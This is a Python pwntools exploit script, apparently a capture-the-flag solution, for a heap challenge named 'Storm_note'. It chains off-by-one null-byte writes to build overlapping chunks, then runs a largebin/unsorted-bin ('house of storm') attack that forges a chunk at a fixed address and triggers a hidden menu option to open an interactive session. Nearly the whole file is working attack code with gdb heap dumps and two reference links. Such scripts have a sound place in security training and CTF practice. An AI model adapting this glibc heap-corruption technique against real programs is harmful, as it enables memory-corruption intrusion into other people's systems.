#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './Storm_note'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 1)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil("Choice: ")
    io.sendline(str(idx))

def alloc(sz):
    menu(1)
    io.recvuntil("size ?")
    io.sendline(str(sz))

def edit(idx, cont):
    menu(2)
    io.recvuntil("Index ?")
    io.sendline(str(idx))
    io.recvuntil("Content: ")
    io.send(cont)

def delete(idx):
    menu(3)
    io.recvuntil("Index ?")
    io.sendline(str(idx))

alloc(0x18) # 0
alloc(0x508) # 1
alloc(0x18) # 2
alloc(0x18) # 3
alloc(0x508) # 4
alloc(0x18) # 5
alloc(0x18) # 6

# edit the presize to 0x500
edit(1, 'a' * 0x4f0 + p64(0x500))
delete(1)

# off by one again
edit(0, 'b' * 0x18)
alloc(0x18) # 1
alloc(0x4d8) # 7

delete(1)
# create overlapping chunk
delete(2)

# gdb-peda$ parseheap
# addr                prev                size                 status              fd                bk
# 0x555555757000      0x0                 0x20                 Used                None              None
# 0x555555757020      0x6262626262626262  0x530                Freed     0x2aaaab097b78    0x2aaaab097b78
# 0x555555757550      0x530               0x20                 Used                None              None

alloc(0x30) # 1
alloc(0x4e8) # 2

# gdb-peda$ parseheap
# addr                prev                size                 status              fd                bk
# 0x555555757000      0x0                 0x20                 Used                None              None
# 0x555555757020      0x6262626262626262  0x40                 Used                None              None
# 0x555555757060      0x0                 0x4f0                Used                None              None
# 0x555555757550      0x0                 0x20                 Used                None              None

# do it again
edit(4, 'a' * 0x4f0 + p64(0x500))
delete(4)
edit(3, 'c' * 0x18)
alloc(0x18) # 4
alloc(0x4d8) # 8
delete(4)
delete(5)
alloc(0x40)

# add into the unsorted bin and largebin
delete(2)
alloc(0x4e8)
delete(2)

storage = 0xabcd0100
fake_chunk = storage - 0x20
layout = [
    '\0' * 16,
    p64(0), # presize
    p64(0x4f1), # size
    p64(0), # fd
    p64(fake_chunk) # bk
        ]

# before editing the unsorted bin chunk
# gdb-peda$ x/20gx 0x555555757060
# 0x555555757060:	0x0000000000000000	0x00000000000004f1
# 0x555555757070:	0x00002aaaab097b78	0x00002aaaab097b78
# 0x555555757080:	0x0000000000000000	0x0000000000000000
# 0x555555757090:	0x0000000000000000	0x0000000000000000
# 0x5555557570a0:	0x0000000000000000	0x0000000000000000
# 0x5555557570b0:	0x0000000000000000	0x0000000000000000

edit(7, flat(layout))

layout = [
        '\0' * 32,
        p64(0), # presize
        p64(0x4e1), # size
        p64(0), # fd
        p64(fake_chunk + 8), # bk
        p64(0), # fd_nextsize
        p64(fake_chunk - 0x18 - 5) # bk_nextsize
        ]

edit(8, flat(layout))

# trigger
alloc(0x48)

edit(2, p64(0) * 8)
io.sendline('666')
io.sendline('\x00'*0x30)

io.interactive()

# https://www.anquanke.com/post/id/176194
# http://blog.eonew.cn/archives/709
